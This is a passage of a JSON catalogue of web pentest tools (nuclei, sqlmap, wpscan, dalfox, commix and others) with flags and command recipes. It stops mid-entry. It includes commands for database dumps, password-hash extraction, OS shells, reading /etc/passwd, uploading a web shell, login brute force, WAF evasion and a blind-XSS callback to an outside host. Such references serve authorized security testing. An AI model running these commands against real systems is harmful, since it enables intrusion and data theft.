@@ -1,0 +1,703 @@
+{
+  "category": "WEB",
+  "catOrder": 2,
+  "tools": [
+    {
+      "title": "nuclei",
+      "subcategory": "Vulnerability template scanner",
+      "purpose": "Fast YAML-template-based scanner from ProjectDiscovery: finds known CVEs, misconfigs, leaks and tech detection across thousands of ready-made rules.",
+      "install": "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
+      "binary": "nuclei",
+      "target": "-u {TARGET}",
+      "modes": [],
+      "groups": [
+        {
+          "name": "Target",
+          "flags": [
+            { "flag": "-u", "value": "{TARGET}", "desc": "Target: single URL or host (can be repeated/comma-separated)" },
+            { "flag": "-l", "value": "targets.txt", "desc": "File with a list of targets, one per line" },
+            { "flag": "-eh", "value": "host", "desc": "Exclude hosts from scanning" },
+            { "flag": "-sa", "desc": "Scan all IPs bound to the target's DNS record" },
+            { "flag": "-im", "value": "list", "desc": "Input format: list/burp/jsonl/yaml/openapi/swagger" }
+          ]
+        },
+        {
+          "name": "Templates",
+          "flags": [
+            { "flag": "-t", "value": "cves/", "desc": "Run the specified templates or template directory" },
+            { "flag": "-turl", "value": "url", "desc": "Run templates from a URL" },
+            { "flag": "-w", "value": "workflow.yaml", "desc": "Run a workflow (chain of templates)" },
+            { "flag": "-as", "desc": "Auto mode: detect technologies and pick templates automatically" },
+            { "flag": "-dast", "desc": "Enable fuzzing/DAST templates" },
+            { "flag": "-nt", "desc": "Run only new (recently added) templates" }
+          ]
+        },
+        {
+          "name": "Filtering",
+          "flags": [
+            { "flag": "-tags", "value": "rce,sqli", "desc": "Take only templates with the specified tags" },
+            { "flag": "-etags", "value": "fuzz", "desc": "Exclude templates by tags" },
+            { "flag": "-severity", "value": "high,critical", "desc": "Only vulnerabilities of the given severity (info/low/medium/high/critical)" },
+            { "flag": "-es", "value": "info", "desc": "Exclude by severity level" },
+            { "flag": "-id", "value": "CVE-2024-1234", "desc": "Run templates with specific IDs" },
+            { "flag": "-author", "value": "pdteam", "desc": "Filter templates by author" }
+          ]
+        },
+        {
+          "name": "Performance",
+          "flags": [
+            { "flag": "-rl", "value": "150", "desc": "Requests-per-second limit (default 150)" },
+            { "flag": "-c", "value": "25", "desc": "Number of templates run in parallel (default 25)" },
+            { "flag": "-bs", "value": "25", "desc": "How many hosts to process in parallel per template" },
+            { "flag": "-timeout", "value": "10", "desc": "Request timeout in seconds" },
+            { "flag": "-retries", "value": "1", "desc": "Number of retries on a failed request" },
+            { "flag": "-mhe", "value": "30", "desc": "Skip a host after N consecutive errors" }
+          ]
+        },
+        {
+          "name": "Network / Request",
+          "flags": [
+            { "flag": "-H", "value": "'Header: v'", "desc": "Add a custom HTTP header to all requests" },
+            { "flag": "-p", "value": "http://127.0.0.1:8080", "desc": "Proxy traffic through HTTP/SOCKS5" },
+            { "flag": "-fr", "desc": "Follow HTTP redirects" },
+            { "flag": "-ni", "desc": "Disable Interactsh (OOB/out-of-band checks)" },
+            { "flag": "-iserver", "value": "url", "desc": "Custom Interactsh server for OOB interactions" }
+          ]
+        },
+        {
+          "name": "Output / Misc",
+          "flags": [
+            { "flag": "-o", "value": "out.txt", "desc": "Save results to a file" },
+            { "flag": "-j", "desc": "Output in JSONL format" },
+            { "flag": "-jle", "value": "out.jsonl", "desc": "Export results to a JSONL file (-jsonl-export)" },
+            { "flag": "-me", "value": "report.md", "desc": "Export results to Markdown (-markdown-export)" },
+            { "flag": "-se", "value": "out.sarif", "desc": "Export to SARIF format" },
+            { "flag": "-irr", "desc": "Include the requests/responses themselves in the output" },
+            { "flag": "-silent", "desc": "Show only findings, without extra output" },
+            { "flag": "-stats", "desc": "Show scan progress statistics" },
+            { "flag": "-duc", "desc": "Do not check for updates at startup" },
+            { "flag": "-ut", "desc": "Update the template database" }
+          ]
+        }
+      ],
+      "recipes": [
+        { "cmd": "nuclei -u {TARGET} -as", "note": "Quick auto-scan: nuclei picks templates for the detected stack itself" },
+        { "cmd": "nuclei -u {TARGET} -severity high,critical -silent", "note": "Only serious findings, quiet output" },
+        { "cmd": "nuclei -l targets.txt -tags cve -o out.txt", "note": "Run a list of targets against CVE templates and save" }
+      ],
+      "notes": "Before a real run, update the templates: nuclei -ut. Tags and -severity sharply reduce the noise."
+    },
+    {
+      "title": "sqlmap",
+      "subcategory": "Automated SQL injection exploitation",
+      "purpose": "The reference tool for finding and exploiting SQL injections: from detecting the entry point to dumping the DB, reading files and getting a shell on the server.",
+      "install": "pipx install sqlmap  # or git clone https://github.com/sqlmapproject/sqlmap",
+      "binary": "sqlmap",
+      "target": "-u {TARGET}",
+      "modes": [],
+      "groups": [
+        {
+          "name": "Target",
+          "flags": [
+            { "flag": "-u", "value": "{TARGET}", "desc": "Target URL with a parameter, e.g. 'http://site/vuln.php?id=1'" },
+            { "flag": "-r", "value": "req.txt", "desc": "Take the entire HTTP request from a file (handy for POST/headers)" },
+            { "flag": "-m", "value": "urls.txt", "desc": "Scan a list of targets from a file" },
+            { "flag": "-g", "value": "'dork'", "desc": "Take targets from Google search results by a dork" },
+            { "flag": "--data", "value": "'id=1'", "desc": "POST data to test (enables POST mode)" },
+            { "flag": "--cookie", "value": "'sid=...'", "desc": "Cookie header value" },
+            { "flag": "-p", "value": "id", "desc": "Test only the specified parameters" }
+          ]
+        },
+        {
+          "name": "Detection (level / risk)",
+          "flags": [
+            { "flag": "--level", "value": "3", "desc": "Test depth 1-5: the higher, the more entry points and payloads. 2+ adds Cookie testing, 3+ adds HTTP header testing (User-Agent, Referer)" },
+            { "flag": "--risk", "value": "2", "desc": "Payload risk 1-3: 1 is safe, 2 adds heavy time-based, 3 adds OR injections (may change/corrupt data on UPDATE)" },
+            { "flag": "--string", "value": "'Welcome'", "desc": "String present in the response when True (helps blind detection)" },
+            { "flag": "--not-string", "value": "'error'", "desc": "String absent from the response when True" },
+            { "flag": "--code", "value": "200", "desc": "HTTP code that indicates a True response" },
+            { "flag": "--smart", "desc": "Deeply test only parameters with positive heuristics (faster)" }
+          ]
+        },
+        {
+          "name": "Techniques (technique)",
+          "flags": [
+            { "flag": "--technique", "value": "BEUSTQ", "desc": "Which injection types to try (default BEUSTQ): B=boolean-blind, E=error-based, U=union, S=stacked queries (multiple queries), T=time-blind, Q=inline queries" },
+            { "flag": "--time-sec", "value": "5", "desc": "Delay for time-based blind, seconds (default 5)" },
+            { "flag": "--union-cols", "value": "1-10", "desc": "Range of the number of columns for UNION injection" },
+            { "flag": "--dbms", "value": "MySQL", "desc": "Force the DBMS (MySQL/PostgreSQL/MSSQL/Oracle/SQLite...) - speeds things up" }
+          ]
+        },
+        {
+          "name": "Enumeration",
+          "flags": [
+            { "flag": "--dbs", "desc": "Enumerate available databases" },
+            { "flag": "--tables", "desc": "Enumerate tables (together with -D)" },
+            { "flag": "--columns", "desc": "Enumerate columns (with -D and -T)" },
+            { "flag": "--schema", "desc": "Dump the full DB schema (databases/tables/columns)" },
+            { "flag": "--count", "desc": "Show the number of records in tables" },
+            { "flag": "-D", "value": "dbname", "desc": "Specify the database" },
+            { "flag": "-T", "value": "users", "desc": "Specify the table(s)" },
+            { "flag": "-C", "value": "user,pass", "desc": "Specify the columns" },
+            { "flag": "--current-user", "desc": "Current DB user" },
+            { "flag": "--current-db", "desc": "Current database" },
+            { "flag": "--is-dba", "desc": "Check whether the user is a DBA (DB admin)" },
+            { "flag": "--users", "desc": "Enumerate DBMS users" },
+            { "flag": "--passwords", "desc": "Dump user password hashes" },
+            { "flag": "--privileges", "desc": "Enumerate user privileges" },
+            { "flag": "-b", "desc": "Get the DBMS banner/version" }
+          ]
+        },
+        {
+          "name": "Data dump",
+          "flags": [
+            { "flag": "--dump", "desc": "Dump table records (with -D/-T/-C narrows the scope)" },
+            { "flag": "--dump-all", "desc": "Dump all tables of all databases" },
+            { "flag": "-a", "desc": "Retrieve everything possible (--all)" },
+            { "flag": "--search", "desc": "Search databases/tables/columns by name" },
+            { "flag": "--where", "value": "\"id>5\"", "desc": "WHERE condition for a selective dump" },
+            { "flag": "--start", "value": "1", "desc": "Which record to start the dump from" },
+            { "flag": "--stop", "value": "100", "desc": "Which record to stop the dump at" },
+            { "flag": "--sql-query", "value": "\"SELECT ...\"", "desc": "Run an arbitrary SQL query" },
+            { "flag": "--sql-shell", "desc": "Interactive SQL console via the injection" }
+          ]
+        },
+        {
+          "name": "WAF bypass / Anonymity",
+          "flags": [
+            { "flag": "--tamper", "value": "space2comment", "desc": "Obfuscate payloads with tamper scripts to bypass WAF/filters" },
+            { "flag": "--list-tampers", "desc": "Show all available tamper scripts" },
+            { "flag": "--random-agent", "desc": "Random User-Agent from the built-in list" },
+            { "flag": "--skip-waf", "desc": "Skip WAF/IPS detection" },
+            { "flag": "--proxy", "value": "http://127.0.0.1:8080", "desc": "Route traffic through a proxy" },
+            { "flag": "--tor", "desc": "Use the Tor network for anonymity" },
+            { "flag": "--check-tor", "desc": "Verify that traffic actually goes through Tor" },
+            { "flag": "--delay", "value": "1", "desc": "Delay between requests, seconds" },
+            { "flag": "--timeout", "value": "30", "desc": "Connection timeout, seconds (default 30)" }
+          ]
+        },
+        {
+          "name": "OS / FS access",
+          "flags": [
+            { "flag": "--os-shell", "desc": "Interactive OS shell on the server (if the DBMS/privileges allow)" },
+            { "flag": "--os-cmd", "value": "'whoami'", "desc": "Run a single OS command" },
+            { "flag": "--os-pwn", "desc": "OOB shell / Meterpreter / VNC via Metasploit" },
+            { "flag": "--file-read", "value": "/etc/passwd", "desc": "Read a file on the DB server" },
+            { "flag": "--file-write", "value": "shell.php", "desc": "Upload a local file to the server" },
+            { "flag": "--file-dest", "value": "/var/www/shell.php", "desc": "Destination path for writing the file" }
+          ]
+        },
+        {
+          "name": "Control / Misc",
+          "flags": [
+            { "flag": "--batch", "desc": "Ask no questions - use the default answer everywhere (for automation)" },
+            { "flag": "--threads", "value": "5", "desc": "Number of parallel requests (max 10) - speeds up the dump" },
+            { "flag": "--flush-session", "desc": "Reset the saved session and start over" },
+            { "flag": "--fresh-queries", "desc": "Ignore the cache and run queries anew" },
+            { "flag": "--crawl", "value": "2", "desc": "Crawl the site to the given depth and test what is found" },
+            { "flag": "--forms", "desc": "Find and test HTML forms on the page" },
+            { "flag": "--parse-errors", "desc": "Show DBMS error texts from the responses" },
+            { "flag": "-v", "value": "3", "desc": "Log verbosity level 0-6" }
+          ]
+        }
+      ],
+      "recipes": [
+        { "cmd": "sqlmap -u {TARGET} --batch --dbs", "note": "Basic run: find the injection and enumerate databases" },
+        { "cmd": "sqlmap -u {TARGET} --batch -D shop -T users --dump", "note": "Dump the users table from the shop database" },
+        { "cmd": "sqlmap -r req.txt --batch --level 3 --risk 2", "note": "POST/complex request from a file with a deeper test" },
+        { "cmd": "sqlmap -u {TARGET} --batch --tamper space2comment --random-agent", "note": "WAF bypass: obfuscation + random User-Agent" },
+        { "cmd": "sqlmap -u {TARGET} --batch --os-shell", "note": "Attempt to get an OS shell with sufficient privileges" }
+      ],
+      "notes": "Start with low --level/--risk and raise them as needed - high values generate a lot of traffic, and --risk 3 (OR injections) can change data. --batch is mandatory for scripts."
+    },
+    {
+      "title": "ghauri",
+      "subcategory": "Fast SQL injection detection",
+      "purpose": "A lightweight, fast alternative to sqlmap for detecting and exploiting SQL injections; often succeeds where sqlmap stalls on blind.",
+      "install": "pipx install ghauri  # or git clone https://github.com/r0oth3x49/ghauri",
+      "binary": "ghauri",
+      "target": "-u {TARGET}",
+      "modes": [],
+      "groups": [
+        {
+          "name": "Target",
+          "flags": [
+            { "flag": "-u", "value": "{TARGET}", "desc": "Target URL with a parameter, e.g. 'http://site/vuln.php?id=1'" },
+            { "flag": "-r", "value": "req.txt", "desc": "Load the HTTP request from a file" },
+            { "flag": "-m", "value": "urls.txt", "desc": "Scan multiple targets from a file" },
+            { "flag": "--data", "value": "'id=1'", "desc": "POST data to test" },
+            { "flag": "--cookie", "value": "'sid=...'", "desc": "Cookie header value" },
+            { "flag": "-p", "value": "id", "desc": "Test only the specified parameters" }
+          ]
+        },
+        {
+          "name": "Request",
+          "flags": [
+            { "flag": "-H", "value": "'X-Up: 1'", "desc": "Additional HTTP header" },
+            { "flag": "--random-agent", "desc": "Random User-Agent" },
+            { "flag": "--proxy", "value": "http://127.0.0.1:8080", "desc": "Proxy for traffic" },
+            { "flag": "--delay", "value": "1", "desc": "Delay between requests, seconds" },
+            { "flag": "--timeout", "value": "30", "desc": "Connection timeout, seconds (default 30)" },
+            { "flag": "--threads", "value": "1", "desc": "Number of parallel requests" }
+          ]
+        },
+        {
+          "name": "Detection / Techniques",
+          "flags": [
+            { "flag": "--level", "value": "1", "desc": "Test depth 1-3: higher means more entry points and payloads" },
+            { "flag": "--technique", "value": "BEST", "desc": "Injection types (default BEST): B=boolean-blind, E=error-based, S=stacked queries, T=time-blind. You can add U=union" },
+            { "flag": "--dbms", "value": "MySQL", "desc": "Force the DBMS" },
+            { "flag": "--time-sec", "value": "5", "desc": "Delay for time-based blind, seconds" },
+            { "flag": "--string", "value": "'OK'", "desc": "String present in the response when True" },
+            { "flag": "--confirm", "desc": "Additionally re-verify the found payloads" }
+          ]
+        },
+        {
+          "name": "Enumeration / Dump",
+          "flags": [
+            { "flag": "--dbs", "desc": "Enumerate databases" },
+            { "flag": "--tables", "desc": "Enumerate tables (with -D)" },
+            { "flag": "--columns", "desc": "Enumerate columns (with -D and -T)" },
+            { "flag": "--dump", "desc": "Dump table records" },
+            { "flag": "--count", "desc": "Number of records in tables" },
+            { "flag": "-D", "value": "dbname", "desc": "Specify the database" },
+            { "flag": "-T", "value": "users", "desc": "Specify the table(s)" },
+            { "flag": "-C", "value": "user,pass", "desc": "Specify the columns" },
+            { "flag": "--current-user", "desc": "Current DB user" },
+            { "flag": "--current-db", "desc": "Current database" },
+            { "flag": "--hostname", "desc": "DB server hostname" },
+            { "flag": "-b", "desc": "Get the DBMS banner/version (--banner)" },
+            { "flag": "--start", "value": "1", "desc": "Which record to start the dump from" },
+            { "flag": "--stop", "value": "100", "desc": "Which record to stop at" }
+          ]
+        },
+        {
+          "name": "Control",
+          "flags": [
+            { "flag": "--batch", "desc": "Ask no questions - use the default values" },
+            { "flag": "--flush-session", "desc": "Reset the saved session" },
+            { "flag": "--fresh-queries", "desc": "Ignore the results cache" },
+            { "flag": "--sql-shell", "desc": "Interactive SQL console (experimental)" },
+            { "flag": "-v", "value": "1", "desc": "Verbosity level 1-5" }
+          ]
+        }
+      ],
+      "recipes": [
+        { "cmd": "ghauri -u {TARGET} --batch --dbs", "note": "Find the injection and enumerate databases" },
+        { "cmd": "ghauri -u {TARGET} --batch -D shop -T users --dump", "note": "Dump the users table" },
+        { "cmd": "ghauri -r req.txt --batch --level 2", "note": "POST/complex request from a file with a deeper test" }
+      ],
+      "notes": "The syntax almost mirrors sqlmap, so recipes are portable. Good for blind injections and when you need speed."
+    },
+    {
+      "title": "wpscan",
+      "subcategory": "WordPress security scanner",
+      "purpose": "A dedicated WordPress scanner: core/plugin/theme versions, known vulnerabilities, user enumeration and login brute force.",
+      "install": "gem install wpscan  # or docker run wpscanteam/wpscan",
+      "binary": "wpscan",
+      "target": "--url {TARGET}",
+      "modes": [],
+      "groups": [
+        {
+          "name": "Target",
+          "flags": [
+            { "flag": "--url", "value": "{TARGET}", "desc": "Address of the target WordPress site" },
+            { "flag": "--wp-content-dir", "value": "wp-content", "desc": "Non-standard path to the wp-content directory" },
+            { "flag": "--wp-plugins-dir", "value": "wp-content/plugins", "desc": "Non-standard path to the plugins directory" }
+          ]
+        },
+        {
+          "name": "Enumeration",
+          "flags": [
+            { "flag": "-e", "value": "vp,vt,u", "desc": "What to enumerate. Options: vp=vulnerable plugins, ap=all plugins, p=plugins, vt=vulnerable themes, at=all themes, t=themes, cb=config backup directories, dbe=DB exports, u=users, m=media. Range: u1-100 - user IDs 1..100" },
+            { "flag": "--plugins-detection", "value": "aggressive", "desc": "Plugin discovery method: passive (quiet), aggressive (full path brute force), mixed" },
+            { "flag": "--plugins-version-detection", "value": "mixed", "desc": "Plugin version detection mode" },
+            { "flag": "--detection-mode", "value": "mixed", "desc": "Overall detection mode: passive/aggressive/mixed" }
+          ]
+        },
+        {
+          "name": "Login brute force",
+          "flags": [
+            { "flag": "-U", "value": "users.txt", "desc": "List of logins (or a single login) to try" },
+            { "flag": "-P", "value": "rockyou.txt", "desc": "Password wordlist for cracking" },
+            { "flag": "--password-attack", "value": "wp-login", "desc": "Brute-force vector: wp-login (login form), xmlrpc (XML-RPC), xmlrpc-multicall (batched, faster)" },
+            { "flag": "--login-uri", "value": "/wp-login.php", "desc": "Non-standard login page URI" }
+          ]
+        },
+        {
+          "name": "Stealth / Network",
+          "flags": [
+            { "flag": "--stealthy", "desc": "Quiet mode: random UA + passive plugin detection" },
+            { "flag": "--random-user-agent", "desc": "Random User-Agent on every request" },
+            { "flag": "-t", "value": "5", "desc": "Maximum parallel threads (--max-threads)" },
+            { "flag": "--throttle", "value": "500", "desc": "Pause between requests, milliseconds" },
+            { "flag": "--proxy", "value": "http://127.0.0.1:8080", "desc": "Proxy (host:port format)" },
+            { "flag": "--proxy-auth", "value": "user:pass", "desc": "Credentials for the proxy" },
+            { "flag": "--http-auth", "value": "user:pass", "desc": "HTTP Basic auth on the site" },
+            { "flag": "--disable-tls-checks", "desc": "Do not verify the TLS certificate" }
+          ]
+        },
+        {
+          "name": "API / Output",
+          "flags": [
+            { "flag": "--api-token", "value": "TOKEN", "desc": "WPScan vulnerability database token (required for CVE data)" },
+            { "flag": "-o", "value": "out.txt", "desc": "Save the result to a file" },
+            { "flag": "-f", "value": "json", "desc": "Output format: cli/json/xml" },
+            { "flag": "--update", "desc": "Update the local vulnerability database" },
+            { "flag": "--force", "desc": "Continue even if the target is not recognized as WordPress" }
+          ]
+        }
+      ],
+      "recipes": [
+        { "cmd": "wpscan --url {TARGET} --enumerate vp,vt,u", "note": "Standard audit: vulnerable plugins/themes and users" },
+        { "cmd": "wpscan --url {TARGET} --enumerate u --api-token TOKEN", "note": "Collect logins + vulnerability data from the WPScan database" },
+        { "cmd": "wpscan --url {TARGET} -U admin -P rockyou.txt --password-attack xmlrpc-multicall", "note": "Fast brute force via XML-RPC multicall" },
+        { "cmd": "wpscan --url {TARGET} --stealthy", "note": "Quiet initial recon without noise" }
+      ],
+      "notes": "Data on specific CVEs only comes with --api-token (free, ~25 requests/day on wpscan.com)."
+    },
+    {
+      "title": "arjun / x8",
+      "subcategory": "Hidden HTTP parameter discovery",
+      "purpose": "Brute-forces thousands of parameter names and finds hidden/undocumented GET/POST/JSON parameters of an endpoint - a starting point for IDOR, injections, logic bypasses.",
+      "install": "pipx install arjun",
+      "binary": "arjun",
+      "target": "-u {TARGET}",
+      "modes": [],
+      "groups": [
+        {
+          "name": "Target",
+          "flags": [
+            { "flag": "-u", "value": "{TARGET}", "desc": "A single target URL" },
+            { "flag": "-i", "value": "targets.txt", "desc": "Import targets from a file (text, Burp or raw request)" },
+            { "flag": "-m", "value": "GET", "desc": "HTTP method: GET / POST / JSON / XML" },
+            { "flag": "--headers", "value": "'Cookie: x=1'", "desc": "Custom HTTP headers for the requests" },
+            { "flag": "--include", "value": "'api_key=KEY'", "desc": "Parameters/data added to every request" }
+          ]
+        },
+        {
+          "name": "Parameter brute force",
+          "flags": [
+            { "flag": "-w", "value": "params.txt", "desc": "Custom wordlist of parameter names" },
+            { "flag": "-c", "value": "250", "desc": "Chunk size - how many parameters to send in one request" },
+            { "flag": "--passive", "desc": "Passive parameter collection from JS and external sources (no brute force)" },
+            { "flag": "--stable", "desc": "Stable mode: slower but more reliable against unstable targets" },
+            { "flag": "--casing", "value": "snake", "desc": "Name casing style (camel/pascal/snake etc.)" }
+          ]
+        },
+        {
+          "name": "Network",
+          "flags": [
+            { "flag": "-t", "value": "10", "desc": "Number of threads" },
+            { "flag": "-d", "value": "0", "desc": "Delay between requests, seconds" },
+            { "flag": "-T", "value": "15", "desc": "Request timeout, seconds" },
+            { "flag": "--rate-limit", "value": "9999", "desc": "Requests-per-second limit" },
+            { "flag": "--disable-redirects", "desc": "Do not follow redirects" }
+          ]
+        },
+        {
+          "name": "Output",
+          "flags": [
+            { "flag": "-o", "value": "out.txt", "desc": "Save the result to a file" },
+            { "flag": "-oT", "value": "out.txt", "desc": "Output in text format" },
+            { "flag": "-oB", "desc": "Output in a format suitable for Burp Suite" },
+            { "flag": "-oJ", "value": "out.json", "desc": "Output in JSON" },
+            { "flag": "-q", "desc": "Quiet mode (minimal output)" }
+          ]
+        }
+      ],
+      "recipes": [
+        { "cmd": "arjun -u {TARGET}", "note": "Basic discovery of hidden GET parameters" },
+        { "cmd": "arjun -u {TARGET} -m POST -oJ out.json", "note": "Brute force POST parameters with JSON output" },
+        { "cmd": "arjun -i targets.txt -t 20", "note": "Batch check of a list of endpoints" }
+      ],
+      "notes": "An alternative is x8 (in Rust, faster): its syntax differs (x8 -u {TARGET} -w params.txt). The binary here is arjun."
+    },
+    {
+      "title": "dalfox",
+      "subcategory": "XSS scanner and parameter analysis",
+      "purpose": "A fast XSS scanner with automatic parameter mining, DOM-XSS checks, WAF bypass and blind-XSS callback integration.",
+      "install": "go install github.com/hahwul/dalfox/v2@latest",
+      "binary": "dalfox",
+      "target": "url {TARGET}",
+      "modes": ["url", "file", "pipe", "sxss", "server"],
+      "groups": [
+        {
+          "name": "Target / Mode",
+          "flags": [
+            { "flag": "url", "value": "{TARGET}", "desc": "Subcommand: scan a single URL (target is a positional argument)" },
+            { "flag": "file", "value": "urls.txt", "desc": "Subcommand: scan a list of URLs from a file" },
+            { "flag": "pipe", "desc": "Subcommand: accept targets from stdin (pipeline)" },
+            { "flag": "sxss", "value": "{TARGET}", "desc": "Subcommand: stored-XSS mode" },
+            { "flag": "-p", "value": "q", "desc": "Test only the specified parameter" },
+            { "flag": "-d", "value": "'q=1'", "desc": "POST data" },
+            { "flag": "-X", "value": "POST", "desc": "HTTP request method" }
+          ]
+        },
+        {
+          "name": "Request",
+          "flags": [
+            { "flag": "--cookie", "value": "'sid=...'", "desc": "Cookie header" },
+            { "flag": "-H", "value": "'X-Api: 1'", "desc": "Custom HTTP header" },
+            { "flag": "--user-agent", "value": "'UA'", "desc": "Custom User-Agent" },
+            { "flag": "--proxy", "value": "http://127.0.0.1:8080", "desc": "HTTP proxy" },
+            { "flag": "-F", "desc": "Follow redirects (--follow-redirects)" },
+            { "flag": "--delay", "value": "0", "desc": "Delay between requests, milliseconds" },
+            { "flag": "--timeout", "value": "10", "desc": "Request timeout, seconds" },
+            { "flag": "-w", "value": "100", "desc": "Number of workers/threads (--worker)" }
+          ]
+        },
+        {
+          "name": "Payloads / Mining",
+          "flags": [
+            { "flag": "--custom-payload", "value": "payloads.txt", "desc": "Custom file of XSS payloads" },
+            { "flag": "-b", "value": "https://xss.ht", "desc": "Callback URL for blind-XSS (--blind)" },
+            { "flag": "--mining-dict", "desc": "Parameter mining by wordlist (enabled by default)" },
+            { "flag": "--mining-dom", "desc": "Parameter mining from the DOM (element name/id)" },
+            { "flag": "--deep-domxss", "desc": "Deeper DOM-XSS check via a headless browser" },
+            { "flag": "--remote-payloads", "value": "portswigger", "desc": "Pull payloads from a remote source" }
+          ]
+        },
+        {
+          "name": "WAF bypass / Filters",
+          "flags": [
+            { "flag": "--waf-evasion", "desc": "Enable WAF bypass (rate adjustment when a WAF is detected)" },
+            { "flag": "--skip-bav", "desc": "Skip BAV checks (basic other vulns: SQLi, SSTI etc.)" },
+            { "flag": "--skip-grepping", "desc": "Skip response grepping by built-in patterns" },
+            { "flag": "--skip-mining-dom", "desc": "Do not mine parameters from the DOM" },
+            { "flag": "--skip-mining-dict", "desc": "Do not mine parameters by wordlist" },
+            { "flag": "--grep", "value": "patterns.json", "desc": "Custom grep patterns to search in responses" }
+          ]
+        },
+        {
+          "name": "Output",
+          "flags": [
+            { "flag": "-o", "value": "out.txt", "desc": "Save the result to a file" },
+            { "flag": "--format", "value": "json", "desc": "Output format: plain / json / jsonl" },
+            { "flag": "-S", "desc": "Quiet mode, findings only (--silence)" },
+            { "flag": "--only-poc", "desc": "Output only PoC (ready confirmations)" },
+            { "flag": "--no-color", "desc": "Disable colored output" },
+            { "flag": "--found-action", "value": "'cmd'", "desc": "Run a command when XSS is found" }
+          ]
+        }
+      ],
+      "recipes": [
+        { "cmd": "dalfox url {TARGET}", "note": "Basic XSS scan of a single URL" },
+        { "cmd": "dalfox url {TARGET} -b https://xss.ht --format json -o out.json", "note": "Scan + blind-XSS callback, JSON output" },
+        { "cmd": "dalfox url {TARGET} --custom-payload payloads.txt --waf-evasion", "note": "Custom payloads and WAF bypass" },
+        { "cmd": "dalfox file urls.txt -S --only-poc", "note": "Batch scan of a list, quiet, PoC only" }
+      ],
+      "notes": "The target is given via a subcommand: dalfox url {TARGET}. The Go version (v2) has url/file/pipe/sxss/server; the new Rust version (v3, 2026) merges everything into a single scan subcommand."
+    },
+    {
+      "title": "commix",
+      "subcategory": "OS command injection exploitation",
+      "purpose": "Automates finding and exploiting OS command injection: from detecting the parameter to a shell, reading/writing files and gathering system info.",
+      "install": "pipx install commix  # or git clone https://github.com/commixproject/commix",
+      "binary": "commix",
+      "target": "-u {TARGET}",
+      "modes": [],
+      "groups": [
+        {
+          "name": "Target",
+          "flags": [
+            { "flag": "-u", "value": "{TARGET}", "desc": "Target URL with a parameter" },
+            { "flag": "-r", "value": "req.txt", "desc": "Load the HTTP request from a file" },
+            { "flag": "-m", "value": "urls.txt", "desc": "Scan multiple targets from a file" },
+            { "flag": "--crawl", "value": "1", "desc": "Crawl the site to the given depth" },
+            { "flag": "--data", "value": "'id=1'", "desc": "POST data to test" },
+            { "flag": "--cookie", "value": "'sid=...'", "desc": "Cookie header" },
+            { "flag": "-p", "value": "id", "desc": "Test only the specified parameters" }
+          ]
+        },
+        {
+          "name": "Request",
+          "flags": [
+            { "flag": "-H", "value": "'X-Up: 1'", "desc": "Additional HTTP header" },
+            { "flag": "--host", "value": "host", "desc": "Host header" },
+            { "flag": "--referer", "value": "url", "desc": "Referer header" },
+            { "flag": "--user-agent", "value": "'UA'", "desc": "Custom User-Agent" },
+            { "flag": "--random-agent", "desc": "Random User-Agent" },
+            { "flag": "--proxy", "value": "http://127.0.0.1:8080", "desc": "Proxy for traffic" },
+            { "flag": "--tor", "desc": "Use the Tor network" },
+            { "flag": "--timeout", "value": "30", "desc": "Connection timeout, seconds" }
+          ]
+        },
+        {
+          "name": "Detection / Techniques",
+          "flags": [
+            { "flag": "--level", "value": "1", "desc": "Test depth 1-3: 1=basic, 2=+Cookie, 3=+HTTP headers" },
+            { "flag": "--technique", "value": "cetf", "desc": "Injection techniques: c=classic (output right in the response), e=eval-based (dynamic eval), t=time-based blind, f=file-based (write to a file and read)" },
+            { "flag": "--skip-technique", "value": "t", "desc": "Exclude the specified techniques" },
+            { "flag": "--prefix", "value": "';'", "desc": "String before the payload" },
+            { "flag": "--suffix", "value": "'#'", "desc": "String after the payload" },
+            { "flag": "--os", "value": "Unix", "desc": "Force the OS (Unix/Windows)" },
+            { "flag": "--smart", "desc": "Deep test only on positive heuristics" }
+          ]
+        },
+        {
+          "name": "Exploitation / Access",
+          "flags": [
+            { "flag": "--os-cmd", "value": "'id'", "desc": "Run a single OS command" },
+            { "flag": "--os-shell", "desc": "Interactive OS shell on the target" },
+            { "flag": "--alter-shell", "value": "Python", "desc": "Use an alternative shell (e.g. Python)" },
+            { "flag": "--all", "desc": "Gather all available system information" },
+            { "flag": "--current-user", "desc": "Current OS user" },
+            { "flag": "--hostname", "desc": "System hostname" },
+            { "flag": "--is-root", "desc": "Check whether the user is root (Unix)" },
+            { "flag": "--is-admin", "desc": "Check administrator privileges (Windows)" },
+            { "flag": "--sys-info", "desc": "OS and system information" },
+            { "flag": "--file-read", "value": "/etc/passwd", "desc": "Read a file from the target" },
+            { "flag": "--file-write", "value": "shell.sh", "desc": "Write a local file to the target" }
+          ]
+        },
+        {
+          "name": "WAF bypass / Control",
+          "flags": [
+            { "flag": "--tamper", "value": "space2ifs", "desc": "Obfuscate payloads with tamper scripts to bypass filters/WAF" },
+            { "flag": "--list-tampers", "desc": "Show available tamper scripts" },
+            { "flag": "--skip-waf", "desc": "Skip WAF/IPS detection" },
+            { "flag": "--shellshock", "desc": "Test for Shellshock (CVE-2014-6271) in CGI" },
+            { "flag": "--batch", "desc": "Ask no questions - use the default answers" },
+            { "flag": "--delay", "value": "0", "desc": "Delay between requests, seconds" },
+            { "flag": "--flush-session", "desc": "Reset the saved session" }
+          ]
+        }
+      ],
+      "recipes": [
+        { "cmd": "commix -u {TARGET} --batch", "note": "Basic command injection detection" },
+        { "cmd": "commix -u {TARGET} --batch --os-shell", "note": "On success - an interactive OS shell" },
+        { "cmd": "commix -r req.txt --batch --level 2", "note": "Request from a file with Cookie testing" },
+        { "cmd": "commix -u {TARGET} --batch --os-cmd 'id'", "note": "Run a single command without interaction" }
+      ],
+      "notes": "Once an entry point is found - try --os-shell right away. --technique narrows the injection types; classic gives instant output, time/file-based work blind."
+    },
+    {
+      "title": "SSTImap / tplmap",
+      "subcategory": "SSTI exploitation (template engines)",
+      "purpose": "Finds and exploits Server-Side Template Injection in dozens of engines (Jinja2, Twig, Freemarker, ERB and others): from detection to eval-code, an OS shell and file operations.",
+      "install": "git clone https://github.com/vladko312/SSTImap && pip install -r SSTImap/requirements.txt",
+      "binary": "sstimap",
+      "target": "-u {TARGET}",
+      "modes": [],
+      "groups": [
+        {
+          "name": "Target",
+          "flags": [
+            { "flag": "-u", "value": "{TARGET}", "desc": "Target URL" },
+            { "flag": "-r", "value": "req.txt", "desc": "Load the HTTP request from a file" },
+            { "flag": "-d", "value": "'q=1'", "desc": "POST data" },
